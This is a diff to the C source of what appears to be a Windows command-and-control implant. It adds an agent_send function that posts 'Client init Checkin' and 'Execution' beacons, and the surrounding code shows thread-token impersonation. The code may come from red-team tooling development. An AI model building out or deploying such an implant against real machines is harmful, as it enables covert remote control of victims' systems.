@@ -58,6 +58,8 @@ int main()
 
     generate_uuid4(heapStorePointer->agentStore->agent_id);
 
+    agent_send(heapStorePointer, "Client init Checkin");
+
     // // move to heapstruct
     // char agent_id[37];
     // generate_uuid4(agent_id);
@@ -135,6 +137,7 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     Thread Stuff
 
     */
+    agent_send(heapStorePointer, "Execution");
 
     // add a get token func here
     if (!set_thread_token(heapStorePointer->currentUserStore->token))
@@ -215,6 +218,61 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     free(OutboundJsonData);                      // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
     return 0;
+}
+
+// Mock simple send
+// a one off send thingy for sending messages with no uuid
+void agent_send(HeapStore *heapStorePointer, const char *input)
+{
+    // Allocate and initialize an outbound JSON structure.
+    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
+    if (!OutboundJsonData)
+    {
+        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
+        return;
+    }
+
+    // Duplicate the agent ID from the heap store.
+    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id);
+    if (!OutboundJsonData->agent_id)
+    {
+        DEBUG_LOG("Memory allocation failed for agent_id.\n");
+        free(OutboundJsonData);
+        return;
+    }
+
+    // Set the command result data to the input provided.
+    OutboundJsonData->command_result_data = strdup(input);
+    if (!OutboundJsonData->command_result_data)
+    {
+        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
+        free(OutboundJsonData->agent_id);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // Since this is a simple send, we are not including a command_id.
+    // If needed, you can modify encode_json to accept NULL for the command_id.
+    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
+                                              OutboundJsonData->command_result_data,
+                                              NULL);
+    if (!encoded_json_response)
+    {
+        DEBUG_LOG("Failed to encode JSON response.\n");
+        free(OutboundJsonData->agent_id);
+        free(OutboundJsonData->command_result_data);
+        free(OutboundJsonData);
+        return;
+    }
+
+    // Send the JSON message to the designated endpoint.
+    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
+
+    // Free the allocated memory.
+    free(encoded_json_response);
+    free(OutboundJsonData->agent_id);
+    free(OutboundJsonData->command_result_data);
+    free(OutboundJsonData);
 }
 
 void generate_uuid4(char *uuid)
